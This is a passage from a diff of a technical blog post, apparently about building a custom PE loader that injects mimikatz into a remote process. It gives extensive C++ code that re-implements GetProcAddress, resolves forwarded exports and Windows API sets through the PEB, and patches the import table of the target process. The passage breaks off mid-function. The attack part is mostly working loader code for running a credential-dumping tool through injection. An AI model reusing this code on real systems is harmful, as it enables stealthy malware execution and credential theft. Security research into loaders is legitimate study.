+<span class="n">PDWORD</span> <span class="n">addressOfNamesRVA</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">imageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span><span class="p">);</span>
+
+<span class="c1">// Get array containing the ordial of the exported functions
+</span>
+<span class="n">PWORD</span> <span class="n">addressOfNameOrdinalsRVA</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWORD</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">imageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="p">);</span></code></pre></figure>
+
+<p>We now can iterate over the exported functions to retrieve the wanted function. Caution, the index of the function address is not the same as the index of its name. We need to use the ordinal as index.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">imageExportDirectory</span><span class="o">-&gt;</span><span class="n">NumberOfFunctions</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// Retrieve the function name
+</span>
+    <span class="n">PSTR</span> <span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">lib</span><span class="o">+</span> <span class="n">addressOfNamesRVA</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="c1">// Retrieve the ordinal of the function
+</span>
+    <span class="n">WORD</span> <span class="n">ordinalName</span> <span class="o">=</span> <span class="p">(</span><span class="n">WORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">addressOfNameOrdinalsRVA</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="c1">// Retrieve the function address
+</span>
+    <span class="n">PVOID</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">addressOfFunctionsRVA</span><span class="p">[</span><span class="n">ordinalName</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">functionName</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Now that we have re-implemented <code class="language-plaintext highlighter-rouge">GetProcAddress</code>, we need our function to resolve the function when it is a forwarded one. To determine if the function is a forwarded function or not, we will observe if the function address is in the memory space of the export directory.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">if</span> <span class="p">((</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">addr</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">imageExportDirectory</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">addr</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">imageExportDirectory</span> <span class="o">+</span> <span class="n">exportDirectorySize</span><span class="p">)</span></code></pre></figure>
+
+<p>Once our condition passed, let’s look at the content of the address returned.
+<img src="assets/img/posts/20240124/fwlib.png" alt="Content of the address of the forwarded function" /></p>
+
+<p>We can observe, that our mimikatz try to import the function <code class="language-plaintext highlighter-rouge">SystemFunction007</code> from the library <code class="language-plaintext highlighter-rouge">advapi32.dll</code>. The function appears to be a forwarded function since it passed our condition. When we look at the address from the function addresses array, we can observe that it contains forwarded library name and the forwarded function name with the format <code class="language-plaintext highlighter-rouge">FORWARDED_LIB.FORWARDED_NAME</code>.<br />
+At this point, this is pretty straightforward, we need to copy the content of the forwarded name and the forwarded library name in the arguments <code class="language-plaintext highlighter-rouge">forwardedLib</code> and <code class="language-plaintext highlighter-rouge">forwardedName</code> that we have previously put in argument of our function.<br />
+And finally we can call <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> on the forwarded library and our function recursively.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">DWORD</span> <span class="n">forwardSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">DWORD</span> <span class="n">forwardOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">CHAR</span> <span class="n">forwardName</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+
+<span class="n">forwardSize</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">addr</span><span class="p">);</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="n">forwardName</span><span class="p">,</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">addr</span><span class="p">,</span> <span class="n">forwardSize</span><span class="p">);</span>
+
+<span class="c1">// The forwardName has a format of DLLNAME.FunctionName so we split with '.'
+</span>
+<span class="k">for</span> <span class="p">(</span><span class="n">forwardOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">forwardOffset</span> <span class="o">&lt;</span> <span class="n">forwardSize</span><span class="p">;</span> <span class="n">forwardOffset</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">forwardName</span><span class="p">[</span><span class="n">forwardOffset</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'.'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">forwardName</span><span class="p">[</span><span class="n">forwardOffset</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">forwardedLib</span><span class="p">)</span>
+    <span class="c1">// +1 -&gt; null byte +4 -&gt; .dll 
+</span>
+    <span class="n">forwardedLib</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
+<span class="k">else</span>
+    <span class="n">forwardedLib</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">LocalReAlloc</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">LMEM_MOVEABLE</span> <span class="o">|</span> <span class="n">LMEM_ZEROINIT</span><span class="p">);</span>
+
+<span class="n">forwardedLib</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">'.'</span><span class="p">;</span>
+<span class="n">forwardedLib</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'d'</span><span class="p">;</span>
+<span class="n">forwardedLib</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'l'</span><span class="p">;</span>
+<span class="n">forwardedLib</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'l'</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">forwardedName</span><span class="p">)</span>
+    <span class="n">forwardedName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">forwardSize</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+<span class="k">else</span>
+    <span class="n">forwardedName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">LocalReAlloc</span><span class="p">(</span><span class="n">forwardedName</span><span class="p">,</span> <span class="n">forwardSize</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">LMEM_MOVEABLE</span> <span class="o">|</span> <span class="n">LMEM_ZEROINIT</span><span class="p">);</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">,</span> <span class="n">forwardName</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">));</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="n">forwardedName</span><span class="p">,</span> <span class="n">forwardName</span> <span class="o">+</span> <span class="n">forwardOffset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">forwardSize</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">));</span>
+
+<span class="k">return</span> <span class="nf">getAddrFunction</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">),</span> <span class="n">forwardedName</span><span class="p">,</span> <span class="n">forwardedLib</span><span class="p">,</span> <span class="n">forwardedName</span><span class="p">);</span></code></pre></figure>
+
+<p>Ok now, we can replace all our <code class="language-plaintext highlighter-rouge">GetProcAddress</code> by our own function.<br />
+Our new function <code class="language-plaintext highlighter-rouge">loadImportTableLibs</code> will now looks like it.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">loadImportTableLibs</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="p">...</span>
+                    <span class="n">PVOID</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">getAddrFunction</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">forwardedLib</span><span class="p">,</span> <span class="n">forwardedName</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">forwardedLib</span> <span class="o">&amp;&amp;</span> <span class="n">forwardedName</span><span class="p">)</span>
+                    <span class="p">{</span>
+                        <span class="n">_dbg</span><span class="p">(</span><span class="s">"Forwarded function found: %s. Need to import lib %s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">forwardedLib</span><span class="p">);</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">remoteLoadLibrary</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">forwardedLib</span><span class="p">))</span>
+                            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+
+                    <span class="p">}</span>
+    <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>And if we test it:
+<img src="assets/img/posts/20240124/fwLibLoad.png" alt="Loading forwarded libraries" /><br />
+We observe that our forwarded libraries are correctly loaded.<br />
+Now let’s adapt our <code class="language-plaintext highlighter-rouge">fixImports</code> function.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">fixImports</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">mod</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+        <span class="n">MODULEENTRY32W</span> <span class="n">me32</span> <span class="o">=</span> <span class="n">getModuleEntry</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">moduleSearched</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">PIMAGE_THUNK_DATA</span> <span class="n">thunk</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+            <span class="n">thunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_THUNK_DATA</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">FirstThunk</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>
+
+            <span class="k">while</span> <span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">IMAGE_SNAP_BY_ORDINAL</span><span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">))</span>
+                <span class="p">{</span>
+                    <span class="p">...</span>
+                <span class="p">}</span>
+                <span class="k">else</span>
+                <span class="p">{</span>
+                    <span class="n">PIMAGE_IMPORT_BY_NAME</span> <span class="n">functionName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_BY_NAME</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>
+                    <span class="n">PVOID</span> <span class="n">remoteAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span><span class="p">)</span> <span class="o">+</span> <span class="n">offsetRdata</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">allocAddrOnTarget</span><span class="p">);</span>
+
+                    <span class="n">PCHAR</span> <span class="n">forwardedName</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
+                    <span class="n">PCHAR</span> <span class="n">forwardedLib</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
+
+                    <span class="n">PVOID</span> <span class="n">addrFunc</span> <span class="o">=</span> <span class="n">getAddrFunction</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">forwardedLib</span><span class="p">,</span> <span class="n">forwardedName</span><span class="p">);</span>
+                    <span class="n">DWORD</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                    <span class="n">ULONGLONG</span> <span class="n">addrFix</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                    <span class="c1">// if forwardedLib and forwardedName are allocated -&gt; it means we face a forwarded function
+</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">forwardedLib</span> <span class="o">&amp;&amp;</span> <span class="n">forwardedName</span><span class="p">)</span>
+                    <span class="p">{</span>
+                        <span class="c1">// need to convert our PCHAR to PWSTR
+</span>
+                        <span class="n">PWSTR</span> <span class="n">forwardedLibWstr</span> <span class="o">=</span> <span class="n">strToWstr</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">);</span>
+                        <span class="c1">// Find if the forwarded lib is loaded
+</span>
+                        <span class="n">MODULEENTRY32W</span> <span class="n">fwMe32</span> <span class="o">=</span> <span class="n">getModuleEntry</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">forwardedLibWstr</span><span class="p">);</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+                        <span class="p">{</span>
+                            <span class="n">_err</span><span class="p">(</span><span class="s">"Failed to find import %ws</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">forwardedLibWstr</span><span class="p">);</span>
+                            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+                        <span class="p">}</span>
+                        <span class="n">HMODULE</span> <span class="n">fwLib</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">);</span>
+                        <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">addrFunc</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">fwLib</span><span class="p">;</span>
+                        <span class="n">addrFix</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
+                        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[FORWARDED FUNCTION] %s is a forwarded function in %ws @ 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">fwMe32</span><span class="p">.</span><span class="n">szModule</span><span class="p">,</span> <span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">);</span>
+
+                    <span class="p">}</span>
+                    <span class="k">else</span>
+                    <span class="p">{</span>
+                        <span class="p">...</span>
+                    <span class="p">}</span>
+    <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Now let’s try this code to see if we can load <code class="language-plaintext highlighter-rouge">mimikatz</code>.
+<img src="assets/img/posts/20240124/apiSet.png" alt="Failed to resolve a forwarded function" /></p>
+
+<p>Our code stoped because it could not find the import <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-0.dll</code>.<br />
+If we look on top of our output to check which forwarded function we attempted to look for.<br />
+<img src="assets/img/posts/20240124/fwApiSet.png" alt="Forwarded function failed" />.</p>
+
+<p>We can see that the function we attempt to patch in the IAT is <code class="language-plaintext highlighter-rouge">CoInitializeEx</code> which is supposed to be forwarded to the library <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-0.dll</code>.<br />
+Let’s look at it in a standalone code with a debugger.
+<img src="assets/img/posts/20240124/apiSetResolve.png" alt="api-ms-win-core-com-l1-1-0.dll loaded" />
+As we can see, we loaded the <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-0.dll</code> library, however the debugger indicates us that it is in reality the library <code class="language-plaintext highlighter-rouge">combase.dll</code>.<br />
+It’s a mechanism created by Microsoft called the API Sets.</p>
+
+<h2 id="handle-api-set">Handle API set</h2>
+
+<h3 id="definition-of-api-sets">Definition of API Sets</h3>
+
+<p>API sets, also known as API set namespaces, are a concept introduced in Windows operating systems to help manage the evolution of the Windows API (Application Programming Interface) and provide a layer of abstraction for developers. API sets play a role in versioning and maintaining compatibility between different versions of Windows.<br />
+Windows implemented this in order to seperate functionalities through virtual names. It is also used to maintain compatibility across different Windows Versions.<br />
+You can find more details about it: <a href="https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-apisets">Documentation Windows on API Sets</a></p>
+
+<p>To sum up, API sets are names that are used as proxy for real DLLs. For our example <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-0.dll</code> is a proxy name for the dll <code class="language-plaintext highlighter-rouge">combase.dll</code>.</p>
+
+<h3 id="how-to-resolve-api-set-names">How to resolve API set names</h3>
+
+<p>When we look at the PEB structure referenced on <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm">Geoff Chappell website</a>, we can observe that at the offset 0x68 we have a pointer to an attribute called <code class="language-plaintext highlighter-rouge">ApiSetMap</code>. This is where we can find the mapping of the API sets. However, when we look at the structure from <code class="language-plaintext highlighter-rouge">winternl.h</code>, we can see that the attribute is not referenced. By performing several tests and calculation, we can find that the <code class="language-plaintext highlighter-rouge">ApiSetMap</code> corresponds to the attribute: <code class="language-plaintext highlighter-rouge">(PPEB)-&gt;Reserved9[0]</code>.</p>
+
+<p>Once we retrieved the pointer to the <code class="language-plaintext highlighter-rouge">ApiSetMap</code>, we will need to cast it in a structure called <code class="language-plaintext highlighter-rouge">API_SET_NAMESPACE</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_API_SET_NAMESPACE</span>
+<span class="p">{</span>
+    <span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">Size</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">Count</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">EntryOffset</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">HashOffset</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">HashFactor</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">API_SET_NAMESPACE</span><span class="p">,</span> <span class="o">*</span><span class="n">PAPI_SET_NAMESPACE</span><span class="p">;</span></code></pre></figure>
+
+<p>With this structure we can calculate the address of the first namespace entry which is a <code class="language-plaintext highlighter-rouge">API_SET_NAMESPACE_ENTRY</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_API_SET_NAMESPACE_ENTRY</span>
+<span class="p">{</span>
+    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">NameOffset</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">NameLength</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">HashedLength</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">ValueOffset</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">ValueCount</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">API_SET_NAMESPACE_ENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PAPI_SET_NAMESPACE_ENTRY</span><span class="p">;</span>
+
+<span class="c1">// Retrieve PEB
+</span>
+<span class="n">PPEB</span> <span class="n">peb</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPEB</span><span class="p">)</span><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="c1">// Get API SET MAP
+</span>
+<span class="n">PAPI_SET_NAMESPACE</span> <span class="n">apiMap</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAPI_SET_NAMESPACE</span><span class="p">)</span><span class="n">peb</span><span class="o">-&gt;</span><span class="n">Reserved9</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="c1">// Get First Entry of API Set Map
+</span>
+<span class="n">PAPI_SET_NAMESPACE_ENTRY</span> <span class="n">ApiMapEntry</span> <span class="o">=</span> <span class="n">PAPI_SET_NAMESPACE_ENTRY</span><span class="p">(</span><span class="n">apiMap</span><span class="o">-&gt;</span><span class="n">EntryOffset</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span><span class="p">);</span></code></pre></figure>
+
+<p>Each namespace entry can have multiple entries. (Yes, a single api set can be a virtual name towards multiple DLLs). Each entry has the type <code class="language-plaintext highlighter-rouge">PAPI_SET_VALUE_ENTRY</code> in which we can find the corresponding dll name.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_API_SET_VALUE_ENTRY</span> <span class="p">{</span>
+    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">NameOffset</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">NameLength</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">ValueOffset</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">ValueLength</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">API_SET_VALUE_ENTRY</span><span class="p">,</span> <span class="o">*</span> <span class="n">PAPI_SET_VALUE_ENTRY</span><span class="p">;</span></code></pre></figure>
+
+<p>When we wrap up everything.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">resolveAPISet</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">PPEB</span> <span class="n">peb</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPEB</span><span class="p">)</span><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+    <span class="n">PAPI_SET_NAMESPACE</span> <span class="n">apiMap</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAPI_SET_NAMESPACE</span><span class="p">)</span><span class="n">peb</span><span class="o">-&gt;</span><span class="n">Reserved9</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="n">PWSTR</span> <span class="n">ApiStrName</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
+    <span class="n">PAPI_SET_NAMESPACE_ENTRY</span> <span class="n">ApiMapEntry</span> <span class="o">=</span> <span class="n">PAPI_SET_NAMESPACE_ENTRY</span><span class="p">(</span><span class="n">apiMap</span><span class="o">-&gt;</span><span class="n">EntryOffset</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">apiMap</span><span class="o">-&gt;</span><span class="n">Count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">ApiStrName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">NameOffset</span><span class="p">);</span>
+        <span class="n">PAPI_SET_VALUE_ENTRY</span> <span class="n">ApiValueEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAPI_SET_VALUE_ENTRY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">ValueOffset</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"API Set %ws -&gt; "</span><span class="p">,</span> <span class="n">ApiStrName</span><span class="p">);</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">ValueCount</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">WCHAR</span> <span class="n">apiRes</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
